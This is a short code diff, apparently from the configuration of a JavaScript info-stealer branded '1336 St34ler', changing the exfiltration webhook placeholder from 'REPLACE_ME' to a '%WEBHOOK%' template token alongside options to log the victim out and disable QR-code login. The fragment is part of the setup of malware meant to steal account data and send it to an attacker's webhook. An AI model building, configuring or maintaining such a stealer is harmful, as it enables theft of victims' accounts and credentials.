@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "1336 St34ler",
 
-    webhook: "REPLACE_ME",
+    webhook: "%WEBHOOK%",
 
     logout: true,
     disable_qr_code: true,
